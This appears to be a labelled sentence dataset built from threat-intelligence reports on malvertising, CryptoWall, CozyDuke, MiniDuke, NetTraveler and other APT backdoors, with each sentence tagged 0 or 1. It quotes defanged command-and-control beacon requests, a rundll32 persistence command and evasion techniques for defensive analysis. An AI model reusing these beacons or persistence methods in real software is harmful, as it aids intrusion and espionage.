Consider how granularly a person can be targeted if this service is used maliciously .	0
If not targeted by the desktop , how about on the mobile platform ? Twitter 's Tailored Audiences just got a little more tailored .	0
Advertisers can now augment their customer data using mobile advertising IDs and mobile phone numbers as a way to reach existing customers and increase audience size .	0
In essence , the move is an extension of Twitter 's Tailored Audiences for CRM retargeting , which allows advertisers to use hashed non-PII email address to retarget existing customers .	0
( email addresses are twitter IDs- so you could be targeted for ad delivery based on your account name or known phone number ) Twitter also rolled out the ability to target lookalike audiences , a function that seems pretty similar to Facebook 's tool of the same name .	0
Twitter 's lookalike modeling uses a proprietary algorithm that examines modeled users looking for similarities related to behaviors , interests , location , demographic attributes and engagement patterns .	0
Twitter described its enhanced as '' part of improved targeting options to help advertisers reach additional users similar to their existing audiences .	0
'' Tailored Audiences , Twitter 's seeming answer to the Facebook Exchange ( FBX ) , officially launched back in December after running retargeting and database matching tests in July .	0
Twitter has appeared to follow Facebook 's lead with a number of its recent roll-outs , including site retargeting , CRM targeting and now retargeting via lookalike audiences .	0
( Facebook also makes it possible to target users by phone numbers through Custom Audiences .	0
) Neustar does provide a real-time bidding ad exchange , but their real market is IP intelligence that they sell to other advertising networks for the purposes of better targeting specific users .	0
In Europe , laws require that advertising networks allow people to opt out of having tracking cookies , which is how many advertisers used to rely upon for ad campaign targeting .	0
To get around this , Neustar perfected IP based targeting , which avoids cookies .	0
They are able to build IP specific browsing profiles based on IP subnets .	0
In a blog post below , Neustar boasts about their direct to IP range and enterprise advertising .	0
How can Neustar IP Intelligence target by IP ? While IP intelligence has been around for many years , the ability to effectively target advertising by audience , based on IP is very new .	0
Neustar IP Intelligence is currently working with select DSP platforms to buy impressions off of the exchanges based on the IP address rather than cookies .	0
This has only been possible with the recent emergence of real time bidding ( RTB ) .	0
The secret sauce is in understanding the IP and the methodology necessary for targeting ads appropriately against it .	0
Is an IP Address like a cookie ? No , an IP address only identifies devices on a network .	0
The IP address does not contain any PII and does not track or store any consumer usage or behavioral information .	0
( But IP ranges are registered by IANA , and you can easily know who owns the ranges ) Product Specific Questions Q1 : How does the process work ? The process works exactly like any advertising network .	0
Instead of buying inventory based on a cookie , Neustar is buying inventory based on an IP address .	0
We run the targeting specifics against our proprietary database and create a custom IP list to target against .	0
Neustar has set up relationships with partners that have built the functionality for this to work end-to-end for our advertisers .	0
Neustar offers a full service ad network .	0
Brand marketers who wish to advertise using IP Audience Targeting can work directly with Neustar to determine custom IP placements , run campaigns , optimization , reporting and billing .	0
Much like any traditional online publisher or online ad network , Neustar manages the entire process .	0
How does Neustar deliver its ads ? We use industry standard methods for delivering our ads , but what makes our approach special is that we bake in the IP data before delivering the inventory with our network partners , which allows us to target display ad campaigns to a specific business or organization .	0
We obtain inventory from ad exchanges , but have our own ad server .	0
Zedo , blamed for recent malvertising via DoubleClick , say they are now trying to protect against malvertisers in this blog here .	0
Less than a week after this announcement , they published another blog post that describes how they can push advertising to specific platforms , devices , as well as specific markets and networks : Users can now target ads to a specific device when trafficking ads .	0
An option for '' Device Targeting '' is now available under '' Targeting '' .	0
A creative targeted to a specific Device will serve only on that Device .	0
All major manufacturers/models are supported by this feature .	0
If a creative is not targeted to any specific device than it will serve on all device .	0
Apart from device , a user can target various devices based on different categories .	0
At any given point of time , a user can target multiple manufacturers and categories .	0
Apart from existing campaign reach report a user can now pull a reach report by creative .	0
The creative reach report is available along with all the existing parameters and can be pulled by month , week or day .	0
Creative reach report will show creative wise reach .	0
It will help to analyze how effective the reach of a creative was .	0
To be clear , RTB networks are legitimate platforms for displaying ads on ad-supported websites .	0
They enable micro-targeting of user 's interest , delivering content that a viewer would likely want to see .	0
As we have detailed here , they can also be mis-appropriated unwittingly by malvertisers using these same tools and techniques to target companies with malware for persistent remote access in addition to traditional click fraud , phishing , and identity theft .	1
Below are links to RTB providers to learn more .	0
Invincea has shown logs from a winning malvertising bid in the price range of 65 cents per impression .	0
That is one ad , on one page , paid for by the malvertiser 's account .	0
This implies that malvertisers have deep pockets , spending hundreds of dollars on ad impressions .	0
So how do they get money to spend on these malicious campaigns ? Invincea recently saw a malvertiser win a bid and delivered a Java exploit .	1
This exploit copied a fully functional version of Chrome into the Java cache directory , and that version of Chrome launched in the background and proceeded to visit websites and click on specific ad banners .	1
It is presumed that these ad banners paid revenue via referral bonuses to the malvertiser .	0
By paying 65 cents to install a background web browser that does nothing but click fraud , the malvertiser is able to reap hundreds if not thousands of dollars in advertising referral income .	1
It is a pretty good return on investment , which in turn allows the malvertiser to fund his micro-targeted malvertising attack campaign .	0
It is ironic , however , that click fraud is what is driving the prices of RTB advertising so high .	0
Malvertising is not only a danger to end users , but it is a danger to the advertising industry as well .	0
The image from Figure 14 below shows a log file of Chrome , in this instance , renamed Oajvliewxpge.exe , injected via Java to run in the background .	0
Invincea detected this attack and killed the infection attempt .	0
This is one instance where the malvertiser wasted his 65 cents .	0
It should be noted that Invincea is uniquely capable of stopping this type of attack .	0
The introduction of Chrome as a browser , which is whitelisted by hash across the AV industry , would go unchecked by the AV and whitelisting applications industry .	0
In this instance , the host was almost converted to a click-fraud bot .	1
But the malware delivery could have been intended for data exfiltration , banking Trojans , or any other more insidious purpose .	1
The ability for advertisers and malvertisers to automatically redirect to self-hosted ad content or exploit pages is driving RTB malvertising .	0
Invincea has witnessed a rash of exploit kits and landing pages hosted on : In most instances , the landing pages are preconfigured with the exploit kit .	1
The malvertiser creates the redirection in his normal ad prior to raising his bids to winning levels .	0
Once several victims are confirmed , those malicious landing pages have the content erased , and the automatic redirection removed to serve '' normal '' ads again .	0
Figures 17 through 21 in the following are screenshots from Invincea 's Threat Management console from various RTB-based malvertising incidents with highlighted URLs for malvertising delivered via RTB ad bidding .	1
In September and October of 2014 , Invincea saw a sharp spike of malvertising delivering CryptoWall ransomware attacks via Real Time Ad Bidding .	1
We observed Real Time Ad bidding platforms , including OpenX , GoogleAds , Yahoo , AOL , and first-impression.com , fall victim to the ransomware malvertising scheme by unwittingly delivering the CryptoWall 2.0 ransomware ads .	1
Ransomware is a particularly pernicious form of malware that fully encrypts the victim 's disk and data files , including remote storage , then demands payment of anywhere from $ 300 to $ 1000 in return for the decryption key .	1
Users are held hostage from their own work , pictures , personal , and proprietary material .	0
To learn more about the scourage of ransomware , see this blog .	0
Based on analysis of Invincea logs in would-be victims targeted by these ads , we have insight into the attacker that is delivering the malicious ads .	1
According to Invincea analysis of ads delivered from first- impression.com , winning ad bids ranging from as low as 30 cents and as high as $ 1.70 , were delivered by a block of unique identifiers .	0
It is highly likely that the same attackers are using other RTB ad platforms .	0
This campaign matches the characteristics described by Proofpoint in its blog in terms of the exploitation methods .	0
Legitimate ad copy is stolen , 3rd party ad networks used to distribute malware , and popular ad- supported websites displaying the malicious ads that exploit unsuspecting visitors with drive-by web exploits .	1
Merely visiting any ad-supported site may result in a CryptoWall ransomware infection .	1
Cryptowall 2.0 utilizes the TOR network to hide its communications , but it quickly encrypts all local files on the disk , and demands bitcoin payment to unlock the files .	1
Many companies have fallen prey to this attack over the past few months , making this one of the most successful Ransomware campaigns to date .	0
Below is a typical Cryptowall 2 infection as seen in the Invincea Management Server logs .	0
This winning ad placement ran on sports.yahoo.com – an Alexa Top 4 rated site .	0
Highlighted in order in Figure 22 is the common filename of obupdat.exe , which has ever changing hashes , followed by the TOR port , and the 3rd party ad platform of first-impression.com .	0
Analysis ( Original report ) : Timeline Analysis ( Original Report ) : Below in Figure 23 is the timeline of the Tor connections and SSL connections employed by CryptoWall .	0
In addition , you can see the ransom note being written to disk on an infected machine in the audit logs in Figure 24 .	1
Figure 25 shows the winning malvertising bid via RTB ad delivery from first-impression.com .	0
Items highlighted in the URL below is userid , and the winning bid price to place malvertising of Cryptowall on sports.yahoo.com , which is 60 cents .	1
In Figure 26 below , we show the unique identifiers for the userID and campaigns to deliver CryptoWall malware that were blocked and audited by Invincea , including the websites that delivered the ads via a third-party ad network over the past month .	0
To reiterate , neither the websites listed here , nor the 3rd party ad network , necessarily was aware of the malicious ads they were serving to the website visitors .	0
It is likely they were not aware without ad screening technology .	0
In each event above , Invincea blocked an attempt to infect an endpoint with Cryptowall 2.0 and prevented CryptoWall from encrypting the user 's file system and holding it hostage .	0
Had the user not been running Invincea , the attack would likely have been successful , and the only way the user would have had to recover the encrypted files would be to pay the attacker the ransom .	0
This is an effective ransom technique , and one that is paying off well for the attackers , who use the income from the attacks to purchase Real Time Ad Bids on RTB networks to infect more users .	0
Most RTB ad providers allow for advertisers to host their own ad content .	0
This allows advertisers to directly collect web impression data of who is hitting which ads , from where , by which IPs , which user- agent strings , and just about anything else you could log about a website visit .	0
In addition , the advertising network does n't have to utilize their own disk space to host the image files , the flash videos or other online content .	0
RTB networks simply do the auctioneering and redirection to the winning content .	0
It is this weakness in security that malvertisers are taking advantage of .	0
If ad networks were to switch to a model where all content is actually hosted by them ( 1st party hosting ) , in a cloud , then the risk of malvertising would drop dramatically .	0
The RubiconProject has a Seller 's Cloud , which could be a security model for the RTB industry .	0
It is inherently more secure way of hosting ad content .	0
Operation DeathClick is an active campaign to micro-target companies via malvertising in order to compromise their networks .	1
Unfortunately , the micro-targeting malvertising technique evades almost all network controls and traditional endpoint anti-virus solutions .	1
Invincea can protect users from this attack type among other targeted and opportunistic web-based threats .	0
For half the price of a candy bar , attackers have the unprecedented ability to deliver malware to you through your web browser simply because of your IP address space and your industry vertical .	1
Most of the attacks featured here were not detected by standard Anti-Virus because the malware hashes constantly change .	1
Web proxy blocking updates , even in real time , will not stop new malvertising landing pages that appear and disappear within minutes .	0
Intelligence feeds from the premier intelligence providers , based on hostname , IP , URL or domain will not be able to block malicious malvertisers quickly enough .	0
Invincea protected users can simply browse and click anything online without fear of compromise or targeted malvertising attacks .	0
Non-Invincea users can attempt to OptOut of directed targeting where you can .	0
European privacy laws for forcing most ad providers to offer the opt-out service ; however , you often have to visit each ad provider individually to choose to opt out .	0
Note , that opting out merely places a blocking cookie in your browser .	0
This means that ad providers will not target or retarget based on cookies .	0
But as shown above , the new targeted advertising is via IP intelligence .	0
10/27 : For clarification , Invincea has added additional notes in this version that the websites shown here and the 3rd party real-time ad networks are being used unwittingly and their resources misappropriated by malvertisers to target companies for persistent remote access , click fraud , and other nefarious activities .	0
This is not a reflection on these companies , nor the services they provide .	0
This paper highlights the problem for greater awareness so the industry collectively can combat this problem perhaps with more effective screening at the source prior to displaying ads .	0
Unit 42 has uncovered a new campaign from the CozyDuke threat actors , aka CozyCar [ 1 ] , leveraging malware that appears to be related to the Seaduke malware described earlier this week by Symantec .	0
[ 2 ] This campaign , which began on July 7 , 2015 , appears to be targeted at government organizations and think - tanks located in democratic countries [ 3 ] , and utilizes compromised , legitimate websites for spear phishing and command and control activity .	1
Unit 42 discovered the extent of this attack using the Palo Alto Networks AutoFocus service , which allows analysts to quickly find correlations among malware samples analyzed by WildFire .	0
All files referenced throughout the analysis are contained in the IOC table at the end of this blog .	0
The current CozyCar campaign includes spear phishing emails that deliver the payload from either by a link to a .zip file on a compromised website or by direct delivery as an attachment to the phish .	1
At the time of our analysis , the phishing link was no longer active .	0
When a user opens the attached file a poorly detected executable file [ VT 1/54 ] is extracted .	0
The initial dropper is a self - extracting archive ( SFX ) .	0
Upon execution , this executable file will drop two files in the % TEMP% directory : a decoy .wav file and the secondary dropper .	0
The CozyDuke group commonly uses legitimate media files to trick users .	0
In reality , while the media - a .wav file with a female voice claiming to be a reporter looking for commentary - is played , the secondary dropper executes in the background .	0
The secondary dropper requests a .swf file using SSL as illustrated in the HTTP traffic below .	0
As of this writing , the domain extranet.qualityplanning[.]com resolved to 64.244.34[.]200 .	0
GET /webscriptsecurity / view/4/player.swf HTTP/1.1 Accept : text / html , application / xhtml+xml,*/ * Accept - Language : en_US User - Agent : Mozilla/5.0 ( compatible ; MSIE 8.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET CLR 1.1.4322 ; .NET CLR 2.0.50727 ) Host : extranet.qualityplanning[.]com Connection : Keep - Alive GET /webscriptsecurity / view/4/player.swf HTTP/1.1 Accept : text / html , application / xhtml+xml,*/ * Accept - Language : en_US User - Agent : Mozilla/5.0 ( compatible ; MSIE 8.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET CLR 1.1.4322 ; .NET CLR 2.0.50727 ) Host : extranet.qualityplanning[.]com Connection : Keep - Alive The secondary dropper then cleans up after itself with a simple vbs script ( md5:0d132ee171768dc30d14590ed2dbadd1 ) that leaves only the decoy multimedia file behind .	1
But what did the dropper do with the .swf file ? While the player.swf file downloaded by the second stage dropper does contain media , it is , again , a decoy .	0
The actual flash component of this file is roughly 16 kb , leaving approximately 200 kb of the file unaccounted for .	0
The second stage dropper contains decoding routines that decode the arbitrary binary data into an executable file .	0
The executable file is dropped in % appdata%/Roaming and appears to try and emulate legitimate software names : TimbuktuDaemon , SearchIndexer , RtkAudioService64 , dirmngr , o2flash , and usbrefs64 .	0
This file was not observed on VirusTotal until July 9 and has extremely low detection rates [ VT : 3/54 ] .	0
It appears that the authors of this particular iteration of the CozyCar group 's malware internally call it " miniDionis " according to pdb strings left in the binary ( c:\BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb ) .	0
It also appears to be an iteration on the " forkmeimfamous " aka Seaduke malware analyzed by Unit 42 in a previous blog [ 4 ] .	0
The malware stores 2 files in the % temp% directory : a configuration file and a secondary dll .	0
The configuration file 's name matches the final characters of the bot_id that is contained within as per the sample below .	0
Analysis of the secondary dll file ( name matches [ A - Z0 - 9]{1}\.tmp ) indicates that its primary function is to serve as a cleanup mechanism for the dropped binary .	1
This is likely an attempt to thwart forensic investigations .	0
Further examination of memory dumps taken following the execution of miniDionis reveals some clues into the beaconing activity exhibited .	0
The malware stores configuration values in memory as key : value pairs .	0
The configuration of miniDionis is a JSON blob with several important sections , which are described in the table below .	0
The functional payload of this Trojan starts by creating a Mutex by splitting the " bot_id " value in the configuration on the hyphen ( " - " ) and using the second portion of the split string ( specifically , " 01MRLXW " in the case of this configuration ) .	0
From a functionality standpoint , the Trojan uses the concept of tasks that are processed and completed using a pool of threads .	0
To obtain tasks , the Trojan will issue an HTTPS request to the C2 server ( " host_scripts " in the configuration ) that resembles the following example beacon .	1
GET /mobile / viewer.php HTTP/1.1 Accept : * / * Accept - Language : en - US User - Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host : www.illuminatistudios[.]net Cookie : SSID = sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 - 25A Accept - Encoding : gzip , deflate Connection : Keep - Alive GET /mobile / viewer.php HTTP/1.1 Accept : * / * Accept - Language : en - US User - Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host : www.illuminatistudios[.]net Cookie : SSID = sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 - 25A Accept - Encoding : gzip , deflate Connection : Keep - Alive The Trojan manually creates the cookie in this HTTP request .	0
The cookie contains ciphertext that the Trojan creates based on the " bot_id " in the JSON configuration .	0
The Trojan compresses the " bot_id " string using zlib and then encrypts it using the RC4 algorithm using a generated key .	0
The generated key is a SHA1 hash of two randomly created strings : the first of which is between 2 and 8 bytes long and the second is between 1 and 7 characters in length .	0
The ciphertext of the " bot_id " is then based64 encoded and finally the appended to the " cookie_name " ( " SSID= " ) in the configuration and sent within the HTTP request to the C2 server .	0
Unit 42 did not observe the first random string ( between 2 and 8 characters in length ) sent to the C2 in the first beacon , which would be required by the C2 to reproduce the exact SHA1 hash used as a key to generate the ciphertext in the cookie .	0
Upon further examination we believe that the C2 will not be able to decrypt the cookie in the first beacon .	0
Instead , the C2 will respond to the first beacon with data that the Trojan will use to extract a string , using a function named TrExtractKey seen in Figure 2 , to replace the first random string used to generate the SHA1 hash .	0
Once the C2 and Trojan have synchronized using this string , the C2 will be able to decrypt subsequent network beacons because the Trojan includes the random string between 1 and 7 characters that makes up the second half of the SHA1 hash within the cookie field before the ciphertext .	0
The C2 communications , and several of the commands we will discuss in this blog , include a rather interesting technique to manually handle HTTP redirection , such as the HTTP 301 Moved Permanently and HTTP 302 Found status codes .	0
The technique used to handle these redirections involves checking for the presence of a " Location " field within the HTTP headers of the server response , then using regular expressions to parse the HTML within server response to find the appropriate URL .	0
The code contains three regular expressions to parse the HTML to locate the URL , the first of which is " < a.*?>.*?</a > " that locates all of the tags associated with link within the HTML .	0
The second regular expression of " onclick=\"Accept();\ " " locates only links within the HTML with a specific " onclick " action .	0
The last regular expression of " href\\s*=\\s*(?:[\"'](?<1>[^\"']*)[\"']|(?<1>\\S+ ) ) " to obtain the correct URL to interact with as the C2 server .	0
Once the C2 and Trojan have synchronized and can decrypt their network communications the C2 server will begin responding to beacons from the Trojan with JSON blobs .	1
Unit 42 has not received any JSON blobs from an active C2 server , but based on static analysis of the Trojan determined the JSON would look as follows .	0
{ ' tasks ' : [ { ' task_id ' : " " , ' task_data ' : { ' command ' : " " , ' data ' : " " } } , ] } { ' tasks ' : [ { ' task_id ' : " " , ' task_data ' : { ' command ' : " " , ' data ' : " " } } , ] } The Trojan takes this JSON blob and adds each task in the list into a pool for processing .	0
Separate worker threads access this pool of tasks and process the commands and perform the necessary activities .	0
Unit 42 analyzed the Trojan 's command handler and found several commands , as seen in Table 2 , which allows the threat actors to carry out a full range of activities on the system .	1
The actors behind the CozyDuke framework are highly sophisticated , motivated , and have become increasingly bold in their campaigns .	0
We recommend that other security practitioners review the included Indicators of Compromise ( IoCs ) to ensure they have not been targets in this campaign , and add the appropriate security controls to prevent future attacks .	0
This group is reliant on social engineering , and thus , user education remains of paramount importance .	0
Palo Alto Networks customers using WildFire were protected from this campaign .	0
All known elements of this campaign have been accurately identified by WildFire as malicious .	0
IOCs Sources [ 1 ] https://securelist.com/blog/research/69731/the-cozyduke-apt/ [ 2 ] http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory [ 3 ] http://www.theregister.co.uk/2015/04/22/cozyduke_hackers_white_house_state_dept_malware/ [ 4 ] http://researchcenter.paloaltonetworks.com/2015/07/unit-42-technical-analysis-seaduke/	0
At the end of April Microsoft announced that a vulnerability in Word was actively being exploited .	0
This vulnerability occurred in parsing RTF files and was assigned CVE-2014-1761 , a thorough analysis of which can be found on the HP Security Research blog .	0
We have since seen multiple cases where this exploit is used to deliver malware and one was particularly interesting as it contained a new variant of MiniDuke ( also known as Win32/SandyEva ) .	1
MiniDuke was first discussed by Kaspersky in March 2013 in their paper The MiniDuke Mystery : PDF 0- day Government Spy Assembler 0x29A Micro Backdoorand shortly after in a paper by Bitdefender .	0
Some of the characteristics of MiniDuke - such as its small size ( 20 KB ) , its crafty use of assembly programming , and the use of zero-day exploits for distribution - made it an intriguing threat .	1
Although the backdoor is still quite similar to its previous versions , some important changes were made since last year , the most notable being the introduction of a secondary component written in JScript to contact a C & C server via Twitter .	1
The exploit document was named Proposal-Cover-Sheet-English.rtf and is quite bland when compared to the documents that were used in 2013 , which were of a political nature .	0
We received the document on April 8th , only three days after the compilation of the MiniDuke payload , dated April 5th in the PE header .	0
The payload remains quite small at only 24 KB .	0
The functionality of the shellcode which is executed by triggering the vulnerability is rather simple and straightforward .	1
After decrypting itself and obtaining the addresses of some functions exported by kernel32.dll , it decrypts and drops the payload in the % TEMP % directory in a file named '' a.l '' which is subsequently loaded by calling kernel32 ! LoadLibraryA .	1
An interesting thing about the shellcode is that before transferring control to any API function it checks the first bytes of the function in order to detect hooks and debugger breakpoints which may be set by security software and monitoring tools .	1
If any of these are found the shellcode skips the first 5 bytes of the function being called by manually executing prologue instructions ( mov edi , edi ; push ebp ; mov ebp , esp ) and then jumping to the function code as illustrated below .	0
The next graph presents the execution flow of this malware when the exploitation is successful .	0
As mentioned previously this version of the MiniDuke payload comes with two modules which we refer to as the main module and the TwitterJS module .	0
Once MiniDuke receives control it checks that the host process is not rundll32.exe and whether the current directory is % TEMP % .	0
If either of those conditions is met the malware assumes it is run for the first time and it proceeds with its installation onto the system .	1
MiniDuke gathers information about the system and encrypts its configuration based on that information , a method also used by OSX/Flashback ( this process is called watermarking by Bitdefender ) .	1
The end result is that it is impossible to retrieve the configuration of an encrypted payload if analyzing it on a different computer .	1
The information collected on infection has not changed since the previous version and consists of the following values : Once the encrypted version of the malware is created , it is written into a file in the % ALLUSERSPROFILE % \Application Data directory .	1
The name of the file is randomly picked from the following values ( you can find this listing and those of the next screenshots on the VirusRadar description : The filename extension is also picked randomly from the following list : To persist on the infected system after reboots , the malware creates a hidden .LNK file in the '' Startup '' directory pointing to the modified main module .	1
The name of the .LNK	0
file is randomly drawn from the following values : The .LNKfile	1
is created using a COM object with the IShellLinkA interface and contains the following command : '' C : \Windows\system32\rundll32.exe % pathtomainmodule % , exportfunction '' Which gives something like : '' C : \Windows\system32\rundll32.exe C : \DOCUME~1\ALLUSE~1\APPLIC~1\data.cat , IlqUenn '' .	1
When the malware is loaded by rundll32.exe and the current directory is n't % TEMP % , the malware starts with gathering the same system information as described in the '' Installation '' section to decrypt configuration information .	1
As with the previous version of MiniDuke , it checks for the presence of the following processes in the system : If any of these are found in the system the configuration information will be decrypted incorrectly , i.e .	0
the malware will run on the system without any communication to C & C servers .	0
If the configuration data is decrypted correctly , MiniDuke retrieves the Twitter page of @ FloydLSchwartz in search of URLs by which to reach C & C server .	1
It looks for the tag '' X ) ) ) '' on the page ( MiniDuke was searching for '' uri ! '' in previous samples ) and if the tag is found it decrypts a URL from the data that follows it .	0
The Twitter account @ FloydLSchwartz does exist but has only retweets and no strings with the special tag .	0
As the next step , MiniDuke gathers the following information from the infected systems : This information is then sent to the C & C server along with the request to download a payload .	1
The final URL used to communicate with the C & C server looks like this : < urlstart > /create.php ? < rndparam > = < systeminfo > Those tokens are derived as follows : An example of such a URL is given below : The payload is downloaded in the file named '' fdbywu '' using the urlmon ! URLDownloadToFileA API : The downloaded payload is a fake GIF8 file containing encrypted executable .	1
The malware processes the downloaded file in the same way as previous samples of MiniDuke : it verifies the integrity of the file using RSA-2048 , then decrypts it , stores in a file and finally executes it .	1
The RSA-2048 public key to verify integrity of the executable inside the GIF file is the same as in the previous version of MiniDuke .	1
In the event that MiniDuke is unable to retrieve a C & C URL from this account , it generates a username to search for based on the current date .	0
The search query changes roughly every seven days and is similar to the backup mechanism in previous versions that was using Google searches .	0
A Python implementation of the algorithm can be found in Appendix B .	0
The TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll , injecting a block of code into it and redirecting the exported functions to this code .	1
Here is how the export address table of the patched binary looks after modifications .	0
This file is then stored in an Alternate Data Stream ( ADS ) in NTUSER.DAT in the % USERPROFILE % folder .	1
Finally this DLL is registered as the Open command when a drive is open , which has the effect of starting the bot every time the user opens a disk drive .	1
Below you can find the content of the init.cmd script used by MiniDuke to install TwitterJS module onto the system .	1
When loaded , TwitterJS instantiates the JScript COM object and decrypts a JScript file containing the core logic of the module .	0
Prior to executing it , MiniDuke applies a light encoding to the script : The next images show the result of two separate obfuscations , we can see that the variables have different values .	1
This is probably done to thwart security systems that scan at the entry points of the JScript engine .	1
The purpose of this script is to use Twitter to find a C & C and retrieve JScript code to execute .	1
It first generates a Twitter user to search for ; this search term changes every 7 days and is actually a match to the real account name , not the Twitter account name .	0
The bot then visits the Twitter profiles returned by the search and looks for links that end with '' .xhtml	0
'' .	0
When one is found , it replaces '' .xhtml	0
'' with '' .php	0
'' and fetches that link .	0
Information about the computer is embedded in the Accept HTTP header .	0
The first link on the retrieved page should contain base64 data ; the name attribute of the link is used as a rolling XOR key to decrypt the JScript code .	0
Finally , MiniDuke calculates a hash of the fetched script and compares it with a hardcoded hash in the TwitterJS script .	0
If they match , the fetched script is executed by calling eval ( ) .	0
The code hashing algorithm used by the component looks very much like SHA-1 but outputs different hashes ( you can find the complete implementation in Appendix B .	0
We decided to search for what was changed in the algorithm ; one of our working hypotheses was that the algorithm might have been altered to make collisions feasible .	0
We could n't find an obvious difference ; all the constants and the steps of the algorithm were as expected .	0
Then we noticed that for short messages only the second 32-bit word was different when compared to the original SHA-1 .	0
By examining how this 2nd word was generated we finally discovered that this was caused by a scope issue .	0
As shown below the SHA-1 function used a variable named f : the function Z ( ) is then called which also uses a variable named f without the var keyword , causing it to be treated as a global variable rather than local to the function .	0
The end result is that the value of f is also changed in the SHA-1 function which affects the value of the 2nd word for that round and ultimately the whole hash for long messages .	0
A likely explanation of how this problem came to be is that the variable names were changed to single letters using an automated tool prior to embedding it in the payload .	0
The 2 f variables probably had different names in the original script which avoided the issue .	0
So this leaves us with two takeaways : 1 ) The difference in the hashing algorithm was unintentional and 2 ) Always declare your local variables with the var keyword .	0
; - ) We generated the list of Twitter search terms for 2013-2014 and checked if any of those were registered .	0
At the moment only one exists , @ AA2ADcAOAA , which is the TwitterJS account that was generated between August 21st and 27th 2013 .	0
This account has no tweets .	0
In an effort to discover potential victims , we registered the Twitter accounts corresponding to the current week both for the main and TwitterJS components and set up tweets with encrypted URLs so that an infected computer would reach out to our server .	0
So far we have received connections via the TwitterJS accounts from four computers located in Belgium , France and the UK .	0
We have contacted national CERTs to notify the affected parties .	0
We detect the RTF exploit document as Win32/Exploit.CVE-2014-1761.D and the MiniDuke components as Win32/SandyEva.G .	0
We have written about NetTraveler before HERE and HERE .	0
Earlier this year , we observed an uptick in the number of attacks against Uyghur and Tibetan supporters using an updated version of the NetTraveler backdoor .	0
Here 's an example of a targeted spear-phishing e-mail directed at Uyghur activists in March 2014 .	1
The e-mail has two attachments , a non-malicious JPG file and a 373 KB Microsoft Word .DOC file .	1
The .DOC	0
file , which in reality is a '' Single File Web Page '' container , also known as '' Web archive file '' , appears to have been created on a system using Microsoft Office - Simplified Chinese .	0
It contains an exploit for the CVE-2012-0158 vulnerability , detected by Kaspersky Lab products as Exploit.MSWord.CVE-2012-0158.db .	0
If run on a vulnerable version of Microsoft Office , it drops the main module as '' net.exe '' ( detected by Kaspersky Lab products as Trojan-Dropper.Win32.Agent.lifr ) , which in turn installs a number of other files .	1
The main C & C module is dumped into '' % SystemRoot % \system32\Windowsupdataney.dll '' , ( detected by Kaspersky as Trojan- Spy.Win32.TravNet.qfr ) .	1
It is registered as a service ( named '' Windowsupdata '' ) through a Windows Batch file named '' DOT.BAT '' ( detected by Kaspersky Lab products as Trojan.BAT.Tiny.b ) : To make sure the malware is n't running multiple times , it uses the mutex '' SD2013 Is Running ! '' to mark its presence in the system .	1
Other known mutexes used by older and current variants include : The malware configuration file is written to the '' SYSTEM '' folder ( as opposed to SYSTEM32 ) and has a slightly new format compared to '' older '' NetTraveler samples : For the record , here 's what an older NetTraveler config file looks like : Obviously , the developers behind NetTraveler have taken steps to try to hide the malware 's configuration .	1
Luckily , the encryption is relatively simple to break .	0
The algorithm is as follows : Once decrypted , the new config looks like this : One can easily see the command-and-control ( C & C ) server in the screenshot above , which is '' uyghurinfo [ . ] com '' .	1
We identified several samples using this new encryption scheme .	0
A list of all the extracted C & C servers can be found below : We recommend blocking all these hosts in your firewall .	0
This year , the actors behind NetTraveler celebrate 10 years of activity .	0
Although the earliest samples we have seen appear to have been compiled in 2005 , there are certain indicators that point to 2004 as the year when their activity started .	0
For 10 years NetTraveler has been targeting various sectors , with a focus on diplomatic , government and military targets .	0
Most recently , the main focus of interest for cyber-espionage activities revolved around space exploration , nano-technology , energy production , nuclear power , lasers , medicine and communications .	0
The targeting of Uyghur and Tibetan activists remains a standard component of their activities and we can assume it will stay this way , perhaps for another 10 years .	0
The attackers behind the breach of the New York Times ' computer network late last year appear to be mounting fresh assaults that leverage new and improved versions of malware .	0
The new campaigns mark the first significant stirrings from the group since it went silent in January in the wake of a detailed expose of the group and its exploits - and a retooling of what security researchers believe is a massive spying operation based in China .	0
The newest campaign uses updated versions of Aumlib and Ixeshe .	0
Aumlib , which for years has been used in targeted attacks , now encodes certain HTTP communications .	1
FireEye researchers spotted the malware when analyzing a recent attempted attack on an organization involved in shaping economic policy .	0
And a new version of Ixeshe , which has been in service since 2009 to attack targets in East Asia , uses new network traffic patterns , possibly to evade traditional network security systems .	1
The updates are significant for both of the longstanding malware families ; before this year , Aumlib had not changed since at least May 2011 , and Ixeshe had not evolved since at least December 2011 .	0
Cybercriminals are constantly evolving and adapting in their attempts to bypass computer network defenses .	0
But , larger , more successful threat actors tend to evolve at a slower rate .	0
As long as these actors regularly achieve their objective ( stealing sensitive data ) , they are not motivated to update or rethink their techniques , tactics , or procedures ( TTPs ) .	0
These threat actors ' tactics follow the same principles of evolution – successful techniques propagate , and unsuccessful ones are abandoned .	0
Attackers do not change their approach unless an external force or environmental shift compels them to .	0
As the old saying goes : If it ai n't broke , do n't fix it .	0
So when a larger , successful threat actor changes up tactics , the move always piques our attention .	0
Naturally , our first priority is ensuring that we detect the new or altered TTPs .	0
But we also attempt to figure out why the adversary changed - what broke ? - so that we can predict if and when they will change again in the future .	0
We observed an example of this phenomenon around May .	0
About four months after The New York Times publicized an attack on its network , the attackers behind the intrusion deployed updated versions of their Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families .	1
The previous versions of Aumlib had not changed since at least May 2011 , and Ixeshe had not evolved since at least December 2011 .	0
We can not say for sure whether the attackers were responding to the scrutiny they received in the wake of the episode .	0
But we do know the change was sudden .	0
Akin to turning a battleship , retooling TTPs of large threat actors is formidable .	0
Such a move requires recoding malware , updating infrastructure , and possibly retraining workers on new processes .	0
The following sections detail the changes to Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe .	0
Aumlib has been used in targeted attacks for years .	0
Older variants of this malware family generated the following POST request : Data sent via this POST request transmitted in clear text in the following structure : A recently observed malware sample ( hash value 832f5e01be536da71d5b3f7e41938cfb ) appears to be a modified variant of Aumlib .	1
